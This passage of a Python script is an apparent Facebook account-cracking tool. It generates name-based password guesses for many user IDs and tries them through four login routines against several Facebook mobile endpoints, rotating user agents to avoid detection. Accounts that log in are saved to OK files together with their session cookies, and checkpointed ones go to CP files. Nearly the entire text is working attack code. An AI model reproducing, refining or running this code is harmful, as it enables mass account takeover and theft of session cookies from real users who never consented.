					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'satu' in method:
				pool.submit(crack,idf,pwv)
			elif 'dua' in method:
				pool.submit(new,idf,pwv)
			elif 'tiga' in method:
				pool.submit(beta,idf,pwv)
			elif 'empat' in method:
				pool.submit(basic,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print(f'{P}\n─────────────────────────────────────────────────────')
	print(f'\t{P}>> Crack Telah Seleai! << ')
	print(f'\t{P}Hasil :  [{H}#{P}] OK : {h}%s  {P}[{k}#{P}] CP : {k}%s{x}'%(ok,cp))
	print(f'{P}─────────────────────────────────────────────────────')
	time.sleep(2)
	exit()
		
		
#Validate
def crack(idf,pwv): 
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
	#sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}│{b}{len(id)}{P}│{ewe}{idf}{P}][Ok:{H}{ok}{P}][Cp:{k}{cp}{P}] ")
	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#Async
def new(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(aan)
	#ua = 'Mozilla/5.0 (Linux; Android 13; SM-A235M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=761503727275074&auth_token=fea9a0825a8e524716aed4794f0428fe&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=761503727275074&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r*--> {H}{idf}|{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METHODE BETA ]-----------------#
def beta(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
	sys.stdout.write(f"\r{P} 🐶 [{ewe}{loop}{P}/{b}{len(id)}{P}]—[{H}{ok}{P}]—[{k}{cp}{P}] ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_3xcld831%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D69f45914-6c8b-4bd0-ae2d-98ebd838a80e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_3xcld831%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D658182831284939%26cbt%3D1684044646644%26e2e%3D%257B%2522init%2522%253A1684044646645%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D297fce79-2a5f-4f0e-a658-2984b6b37b72%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb658182831284939%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36e881f3-202f-4db0-aada-31426d46b4d8%26tp%3Dunspecified&cancel_url=fb658182831284939%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#Mbasic
def basic(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	prog.update(des,description=f'\r{h}[𝐌𝐁𝐀𝐒𝐈𝐂] {xxx}{idf} {loop}/{len(id)} 𝙻𝙸𝚅𝙴-:[bold green]{ok}[/] 𝙲𝙷𝙴𝙲𝙺-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			url = random.choice([f"mbasic.facebook.com","d.facebook.com","m.beta.facebook.com"])
			ses.headers.update({'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'})
			p = ses.get(f'https://{url}/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://{url}/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua': '" Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{N}[LOGIN CEPE] :{K} {idf}   {x}[PASSWORD] : {k} {pw}\n {x}USER AGENT :{hijo} {ua}  {N}")
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{N}[LOGIN SUKSES] : {H}{idf}   {x}[PASSWORD] : {hijo} {pw}   COOKIE :{hijo} {kuki}\n   {x}USERT AGENT :{hijo} {ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()